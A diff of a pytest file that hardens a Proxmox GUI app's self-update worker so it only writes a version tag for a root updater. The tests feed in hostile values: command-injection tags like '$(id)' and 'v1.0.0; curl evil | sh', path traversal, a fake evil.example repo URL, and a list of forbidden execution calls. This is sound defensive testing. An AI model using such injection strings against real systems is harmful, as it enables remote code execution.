@@ -1,129 +1,26 @@
-"""Self-update tests (DEPLOY-04, plan 05-04).
+"""Self-update tests (DEPLOY-04; hardened in docs/hardening/UPDATER.md, F-03).
 
-Task 2, TDD RED phase:
-
-Three behaviours are foundational and must be tested:
-
-1. **WAL-safe DB snapshot.** ``snapshot_db`` MUST go through
-   ``sqlite3.connect(src).backup(dst)`` — NOT ``shutil.copy``. The test seeds a
-   row in a WAL-mode SQLite DB, takes a snapshot, opens the snapshot as a fresh
-   connection, and asserts the row is readable.
-
-2. **SHA-256 manifest verification.** ``verify_sha256`` returns ``True`` for
-   a matching digest and ``False`` for a mismatch.
-
-3. **202-enqueue route.** ``POST /api/v1/admin/self-update`` admin-only,
-   CSRF-protected, returns 202 with a job_id; a non-admin gets 403; missing
-   arq_pool returns 503.
-
-4. **run_self_update orchestration (basic shape).** The function body exists
-   (not the 05-01 NotImplementedError stub), references the manifest verify
-   helper, takes the WAL-safe snapshot, and ends in a terminal job state on a
-   simulated failure path (mismatched SHA-256 → job state == failed).
+1. **202-enqueue route.** ``POST /api/v1/admin/self-update`` admin-only, CSRF-protected,
+   returns 202 with a job_id; a non-admin gets 403; missing arq_pool returns 503; the
+   version must be a clean ``vX.Y.Z`` tag.
+2. **The worker job only talks to the root updater.** It validates the tag, writes a tiny
+   request file and mirrors ``status.json``. It contains no subprocess, no sudo and no
+   extraction. Download, signature/hash verification, tarball validation, backup, migration
+   and rollback are the updater's job and are tested in ``deploy/tests/test_updater.sh``.
 """
 
 from __future__ import annotations
 
-import hashlib
+import asyncio
 import json
-import os
-import sqlite3
 from pathlib import Path
 
 import pytest
-from sqlalchemy import select
 
 from tests.factories import login_as, make_user
 
-
 # ---------------------------------------------------------------------------
-# 1. WAL-safe DB snapshot
-# ---------------------------------------------------------------------------
-
-
-def test_snapshot_db_uses_online_backup_api(tmp_path: Path):
-    """snapshot_db must round-trip rows from a WAL-mode source DB."""
-    from app.selfupdate.service import snapshot_db
-
-    src = tmp_path / "src.db"
-    dst = tmp_path / "src.db.pre-update"
-
-    # Seed a WAL-mode SQLite with one row, then close cleanly.
-    conn = sqlite3.connect(src)
-    conn.execute("PRAGMA journal_mode=WAL")
-    conn.execute("CREATE TABLE t (k TEXT, v TEXT)")
-    conn.execute("INSERT INTO t VALUES ('alpha', 'beta')")
-    conn.commit()
-    conn.close()
-
-    snapshot_db(str(src), str(dst))
-
-    assert dst.exists()
-    # Read the snapshot as a brand-new connection — proves the backup folded
-    # any WAL frames into the destination file (a plain `shutil.copy` of the
-    # main DB file without the -wal would lose the row).
-    out = sqlite3.connect(dst)
-    row = out.execute("SELECT k, v FROM t").fetchone()
-    out.close()
-    assert row == ("alpha", "beta")
-
-
-def test_snapshot_db_does_not_use_shutil_copy():
-    """Defense-in-depth: the implementation must not call shutil.copy on the DB.
-
-    Pitfall 1 / Threat T-05-04-04: a plain file copy of a WAL-mode SQLite leaves
-    the latest writes in the -wal sidecar file. The grep-style check here
-    asserts the implementation uses the sqlite3 online-backup API instead.
-    """
-    src = Path(__file__).resolve().parents[1] / "app" / "selfupdate" / "service.py"
-    body = src.read_text()
-    # The backup API call (`.backup(`) must appear; shutil.copy on a db must not.
-    assert ".backup(" in body, "snapshot_db must use sqlite3's .backup() API"
-    assert "shutil.copy" not in body, (
-        "snapshot_db must NEVER shutil.copy a WAL-mode DB (Pitfall 1)"
-    )
-
-
-# ---------------------------------------------------------------------------
-# 2. SHA-256 manifest verification
-# ---------------------------------------------------------------------------
-
-
-def test_verify_sha256_accepts_matching_digest(tmp_path: Path):
-    from app.selfupdate.service import verify_sha256
-
-    payload = b"the quick brown fox"
-    tarball = tmp_path / "release.tar.gz"
-    tarball.write_bytes(payload)
-    expected = hashlib.sha256(payload).hexdigest()
-
-    assert verify_sha256(str(tarball), expected) is True
-
-
-def test_verify_sha256_rejects_mismatched_digest(tmp_path: Path):
-    from app.selfupdate.service import verify_sha256
-
-    tarball = tmp_path / "release.tar.gz"
-    tarball.write_bytes(b"x" * 1024)
-    wrong = "0" * 64
-
-    assert verify_sha256(str(tarball), wrong) is False
-
-
-def test_verify_sha256_is_case_insensitive(tmp_path: Path):
-    """Manifests sometimes uppercase the hex digest — accept both."""
-    from app.selfupdate.service import verify_sha256
-
-    payload = b"data"
-    tarball = tmp_path / "release.tar.gz"
-    tarball.write_bytes(payload)
-    expected = hashlib.sha256(payload).hexdigest().upper()
-
-    assert verify_sha256(str(tarball), expected) is True
-
-
-# ---------------------------------------------------------------------------
-# 3. 202-enqueue route
+# 1. 202-enqueue route
 # ---------------------------------------------------------------------------
 
 
@@ -240,153 +137,266 @@ async def test_self_update_route_rejects_bad_version(client, session_factory):
 
 
 # ---------------------------------------------------------------------------
-# 4. run_self_update body — manifest-mismatch abort + rollback shape
+# 2. The worker job: request file + status mirror (no subprocess, no sudo)
 # ---------------------------------------------------------------------------
 
-
-def test_run_self_update_body_replaces_placeholder():
-    """Plan 05-01 left a NotImplementedError placeholder; this plan replaces it."""
-    body = (
-        Path(__file__).resolve().parents[1] / "app" / "jobs" / "selfupdate_functions.py"
-    ).read_text()
-    # The placeholder marker MUST be gone.
-    assert 'NotImplementedError("implemented in 05-04")' not in body, (
-        "run_self_update placeholder still in place — plan 05-04 must replace it"
-    )
-    # The orchestration must touch the four canonical anchors.
-    assert "verify_sha256" in body, "must reference SHA-256 verify"
-    assert "snapshot_db" in body or "app.db.pre-update" in body, (
-        "must reference the WAL-safe snapshot"
-    )
-    assert "health" in body.lower(), "must reference the health check"
-    assert "rollback" in body.lower() or "restore" in body.lower(), (
-        "must reference the rollback path"
-    )
+APP_DIR = Path(__file__).resolve().parents[1] / "app"
 
 
-@pytest.mark.asyncio
-async def test_run_self_update_aborts_on_manifest_mismatch(
-    session_factory, tmp_path, monkeypatch,
-):
-    """A SHA-256 mismatch must mark the job failed and abort BEFORE any swap.
-
-    Threat T-05-04-01: a tampered tarball must not be unpacked. The job row's
-    terminal state proves the abort happened; the absence of a release dir
-    under tmp_path proves no unpack occurred.
-    """
+@pytest.fixture()
+def updater_env(tmp_path, monkeypatch):
+    """Point the worker's file protocol at tmp_path and install a fake updater binary."""
+    from app.config import settings
     from app.jobs import selfupdate_functions
-    from app.jobs.selfupdate_functions import run_self_update
+
+    updater = tmp_path / "proxmox-gui-updater"
+    updater.write_text("#!/bin/sh\n")
+    updater.chmod(0o755)
+    monkeypatch.setattr(settings, "updater_path", updater)
+    monkeypatch.setattr(settings, "update_request_path", tmp_path / "update" / "request")
+    monkeypatch.setattr(settings, "update_status_path", tmp_path / "run" / "status.json")
+    monkeypatch.setattr(settings, "release_conf_path", tmp_path / "release.conf")
+    monkeypatch.setattr(selfupdate_functions, "POLL_INTERVAL_S", 0.02)
+    monkeypatch.setattr(selfupdate_functions, "POLL_TIMEOUT_S", 0.6)
+    (tmp_path / "run").mkdir()
+    return tmp_path
+
+
+async def _seed_job(session_factory, payload: dict | None = None) -> int:
     from app.models import Job
-    from app.selfupdate import service
 
-    # Sandbox the worker job's filesystem effects under tmp_path so the test
-    # never touches /var/lib/proxmox-gui or /opt/proxmox-gui.
-    sandbox_staging = tmp_path / "staging"
-    sandbox_staging.mkdir()
-    monkeypatch.setattr(selfupdate_functions, "STAGING_DIR", str(sandbox_staging))
-
-    # Seed a pending self-update job row.
     async with session_factory() as db:
         job = Job(
-            kind="admin.self-update",
-            cluster_id=None,
-            team_id=None,
-            actor_user_id=None,
-            payload=json.dumps({}),
-            state="pending",
+            kind="admin.self-update", cluster_id=None, team_id=None, actor_user_id=None,
+            payload=json.dumps(payload if payload is not None else {}), state="pending",
             idempotency_key=None,
         )
         db.add(job)
         await db.commit()
         await db.refresh(job)
-        job_id = job.id
+        return job.id
 
-    # Manifest declares a digest the tarball does NOT match → verify_sha256
-    # returns False → the job aborts BEFORE _locate_update_sh or any
-    # systemctl call.
-    fake_tarball_body = b"genuine release body"
-    wrong_digest = "0" * 64
 
-    async def fake_fetch_manifest(version, **kwargs):
-        return {
-            "version": version or "v0.0.0",
-            "tarball_url": "https://example.invalid/fake.tar.gz",
-            "sha256": wrong_digest,
-        }
-
-    async def fake_download(url, dst):
-        os.makedirs(os.path.dirname(dst), exist_ok=True)
-        Path(dst).write_bytes(fake_tarball_body)
-
-    # Stub the rollback systemctl path so the test does not depend on `sudo`
-    # being installed; the rollback writes whatever we return into the
-    # friendly_error and the test only asserts on terminal state + the
-    # original error message.
-    async def fake_systemctl_restart(unit):
-        return 0, ""
-
-    monkeypatch.setattr(service, "fetch_release_manifest", fake_fetch_manifest)
-    monkeypatch.setattr(service, "download_tarball", fake_download)
-    monkeypatch.setattr(
-        selfupdate_functions, "_systemctl_restart", fake_systemctl_restart
-    )
-
-    ctx = {"sessionmaker": session_factory, "redis": None}
-    await run_self_update(ctx, job_id)
+async def _final(session_factory, job_id: int):
+    from app.models import Job
 
     async with session_factory() as db:
-        final = await db.get(Job, job_id)
-        assert final is not None
-        # Never succeeded.
-        assert final.state in {"failed", "needs_review"}, final.state
-        # The original error (the manifest mismatch) MUST be on the row,
-        # not just the rollback log.
-        original_error = (final.error or "").lower()
-        assert "manifest" in original_error or "sha" in original_error, (
-            f"expected manifest/sha error, got: {final.error!r}"
-        )
+        return await db.get(Job, job_id)
+
+
+def _status(tmp, **kw) -> None:
+    data = {"state": "running", "step": "downloading", "target": "v0.9.0", "from": "v0.8.0",
+            "message": "", "rolled_back": False, "updated_at": "2999-01-01T00:00:00Z"}
+    data.update(kw)
+    (tmp / "run" / "status.json").write_text(json.dumps(data))
+
+
+async def _run(session_factory, job_id):
+    from app.jobs.selfupdate_functions import run_self_update
+
+    await run_self_update({"sessionmaker": session_factory, "redis": None}, job_id)
 
 
 @pytest.mark.asyncio
-async def test_run_self_update_assert_inside_releases_blocks_traversal(
-    tmp_path, monkeypatch,
-):
-    """The symlink-swap guard refuses targets outside /opt/proxmox-gui/releases.
+async def test_worker_writes_only_the_tag_and_mirrors_success(session_factory, updater_env):
+    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
 
-    Pitfall 7 / Threat T-05-04-03 — a traversal-laced manifest must not be
-    able to point ``current`` at /etc/proxmox-gui (where the master key lives).
-    """
-    from app.jobs import selfupdate_functions
-    from app.jobs.selfupdate_functions import _assert_inside_releases
+    async def updater():
+        req = updater_env / "update" / "request"
+        for _ in range(200):
+            if req.exists():
+                break
+            await asyncio.sleep(0.01)
+        assert req.read_text() == "v0.9.0"  # nothing but the tag
+        assert (req.stat().st_mode & 0o777) == 0o640
+        _status(updater_env, state="running")
+        await asyncio.sleep(0.05)
+        _status(updater_env, state="succeeded", message="updated from v0.8.0 to v0.9.0")
 
-    # Point the RELEASES_DIR at a sandbox; then prove the guard rejects an
-    # absolute path outside it.
-    sandbox = tmp_path / "releases"
-    sandbox.mkdir()
-    monkeypatch.setattr(selfupdate_functions, "RELEASES_DIR", str(sandbox))
+    await asyncio.gather(_run(session_factory, job_id), updater())
+    final = await _final(session_factory, job_id)
+    assert final.state == "succeeded"
+    assert "v0.9.0" in (final.friendly_error or "")
 
-    # Inside the sandbox = ok.
-    (sandbox / "v1").mkdir()
-    _assert_inside_releases(str(sandbox / "v1"))  # must not raise
 
-    # Outside the sandbox = guard fires.
-    with pytest.raises(RuntimeError, match="outside"):
-        _assert_inside_releases("/etc/proxmox-gui")
+@pytest.mark.asyncio
+async def test_worker_mirrors_updater_failure_and_rollback(session_factory, updater_env):
+    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
+
+    async def updater():
+        while not (updater_env / "update" / "request").exists():  # noqa: ASYNC110 - test poller
+            await asyncio.sleep(0.01)
+        _status(updater_env, state="failed", message="post-update health check failed", rolled_back=True)
+
+    await asyncio.gather(_run(session_factory, job_id), updater())
+    final = await _final(session_factory, job_id)
+    assert final.state == "failed"
+    assert "health check" in (final.error or "")
+    assert "rolled back" in (final.friendly_error or "")
+
+
+@pytest.mark.asyncio
+async def test_worker_treats_noop_as_success(session_factory, updater_env):
+    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
+
+    async def updater():
+        while not (updater_env / "update" / "request").exists():  # noqa: ASYNC110 - test poller
+            await asyncio.sleep(0.01)
+        _status(updater_env, state="noop", message="already running v0.9.0")
+
+    await asyncio.gather(_run(session_factory, job_id), updater())
+    assert (await _final(session_factory, job_id)).state == "succeeded"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "bad",
+    [".", "..", "a b", "$(id)", "v1.0.0;id", "v1.0", "1.2.3", "master", "latest", "v1..0.0", "../v1.0.0",
+     "v1.0.0\nv2.0.0", "v" + "1" * 70 + ".0.0", "v1.0.0-a..b"],
+)
+async def test_worker_rejects_hostile_versions_without_writing_a_request(session_factory, updater_env, bad):
+    job_id = await _seed_job(session_factory, {"target_version": bad})
+    await _run(session_factory, job_id)
+    assert (await _final(session_factory, job_id)).state == "failed"
+    assert not (updater_env / "update" / "request").exists()
+
+
+@pytest.mark.asyncio
+async def test_worker_fails_cleanly_when_the_updater_is_absent(session_factory, updater_env):
+    (updater_env / "proxmox-gui-updater").unlink()
+    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
+    await _run(session_factory, job_id)
+    final = await _final(session_factory, job_id)
+    assert final.state == "failed"
+    assert "updater" in (final.error or "")
+    assert "install.sh --update" in (final.friendly_error or "")
+    assert not (updater_env / "update" / "request").exists()
+
+
+@pytest.mark.asyncio
+async def test_worker_refuses_when_a_request_is_already_pending(session_factory, updater_env):
+    (updater_env / "update").mkdir()
+    (updater_env / "update" / "request").write_text("v0.8.1")
+    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
+    await _run(session_factory, job_id)
+    assert (await _final(session_factory, job_id)).state == "failed"
+    assert (updater_env / "update" / "request").read_text() == "v0.8.1"  # untouched
+
+
+@pytest.mark.asyncio
+async def test_worker_ignores_a_stale_status_from_an_earlier_run(session_factory, updater_env):
+    """A `succeeded` for the same target written BEFORE our request must not end this job."""
+    _status(updater_env, state="succeeded", updated_at="2000-01-01T00:00:00Z")
+    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
+    await _run(session_factory, job_id)  # the updater never answers
+    final = await _final(session_factory, job_id)
+    assert final.state == "failed"
+    assert "timed out" in (final.error or "")
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("garbage", ["not json", "[]", '{"state": "exploded"}', "null", '{"state": {"x": 1}}'])
+async def test_worker_survives_garbage_status_files(session_factory, updater_env, garbage):
+    (updater_env / "run" / "status.json").write_text(garbage)
+    job_id = await _seed_job(session_factory, {"target_version": "v0.9.0"})
+    await _run(session_factory, job_id)
+    assert (await _final(session_factory, job_id)).state == "failed"
+
+
+@pytest.mark.asyncio
+async def test_latest_is_resolved_from_the_pinned_fork_and_validated(session_factory, updater_env, monkeypatch):
+    from app.selfupdate import service
+
+    (updater_env / "release.conf").write_text("REPO_URL=https://github.com/o/r\n")
+    seen = {}
+
+    async def fake_latest(repo_url):
+        seen["repo"] = repo_url
+        return service.validate_tag("v0.9.0")
+
+    monkeypatch.setattr(service, "resolve_latest_tag", fake_latest)
+    job_id = await _seed_job(session_factory, {"target_version": None})
+
+    async def updater():
+        while not (updater_env / "update" / "request").exists():  # noqa: ASYNC110 - test poller
+            await asyncio.sleep(0.01)
+        _status(updater_env, state="succeeded", message="ok")
+
+    await asyncio.gather(_run(session_factory, job_id), updater())
+    assert seen["repo"] == "https://github.com/o/r"  # never the upstream author's repo
+    assert (updater_env / "update" / "request").read_text() == "v0.9.0"
+    assert (await _final(session_factory, job_id)).state == "succeeded"
+
+
+@pytest.mark.asyncio
+async def test_a_hostile_latest_tag_from_github_is_rejected(session_factory, updater_env, monkeypatch):
+    import httpx
+
+    (updater_env / "release.conf").write_text("REPO_URL=https://github.com/o/r\n")
+
+    class FakeResp:
+        status_code = 200
+
+        def json(self):
+            return {"tag_name": "v1.0.0; curl evil | sh"}
+
+    class FakeClient:
+        def __init__(self, *a, **k): ...
+        async def __aenter__(self): return self
+        async def __aexit__(self, *a): return False
+        async def get(self, *a, **k): return FakeResp()
+
+    monkeypatch.setattr(httpx, "AsyncClient", FakeClient)
+    job_id = await _seed_job(session_factory, {})
+    await _run(session_factory, job_id)
+    assert (await _final(session_factory, job_id)).state == "failed"
+    assert not (updater_env / "update" / "request").exists()
+
+
+def test_release_conf_must_name_a_github_repo(tmp_path):
+    from app.selfupdate.service import read_repo_url
+
+    good = tmp_path / "a"
+    good.write_text("REPO_URL=https://github.com/dakser/proxmox-gui\n")
+    assert read_repo_url(good) == "https://github.com/dakser/proxmox-gui"
+    for bad in ("REPO_URL=http://github.com/o/r", "REPO_URL=https://evil.example/o/r",
+                "REPO_URL=https://github.com/o/r.git", "REPO_URL=https://github.com/o/r/x", "X=1", ""):
+        f = tmp_path / "b"
+        f.write_text(bad + "\n")
+        with pytest.raises(RuntimeError):
+            read_repo_url(f)
+
+
+def test_worker_module_has_no_process_execution_sudo_or_extraction():
+    """F-03: the unprivileged worker must never run anything or unpack anything."""
+    import re
+
+    for rel in ("jobs/selfupdate_functions.py", "selfupdate/service.py"):
+        code = "\n".join(
+            line for line in (APP_DIR / rel).read_text().splitlines() if not line.lstrip().startswith("#")
+        )
+        code = re.sub(r'""".*?"""', "", code, flags=re.S)  # docstrings may explain what is NOT done
+        for forbidden in ("subprocess", "create_subprocess", "os.system", "sudo", "tarfile", "tar ", "systemctl",
+                          "shutil", "update.sh", "pip install", "urlopen"):
+            assert forbidden not in code, f"{rel} must not contain {forbidden!r}"
+
+
+def test_updater_helpers_from_the_unsafe_design_are_gone():
+    from app.selfupdate import service
+
+    for name in ("download_tarball", "verify_sha256", "fetch_release_manifest", "snapshot_db"):
+        assert not hasattr(service, name), f"{name} belonged to the removed in-worker update path"
 
 
 # ---------------------------------------------------------------------------
-# 5. Worker imports cleanly with the real run_self_update body
+# 3. Worker registration
 # ---------------------------------------------------------------------------
 
 
-def test_worker_settings_imports_with_real_run_self_update():
-    """The worker.py registration must still resolve to the real body."""
+def test_worker_settings_registers_the_real_run_self_update():
     from app.jobs import selfupdate_functions
     from app.jobs.worker import WorkerSettings
 
-    # Find the func registration for admin.self-update and assert it points at
-    # the (now-real) run_self_update.
     matches = [f for f in WorkerSettings.functions if getattr(f, "name", "") == "admin.self-update"]
     assert matches, "admin.self-update is not registered in WorkerSettings.functions"
-    f = matches[0]
-    assert f.coroutine is selfupdate_functions.run_self_update
+    assert matches[0].coroutine is selfupdate_functions.run_self_update
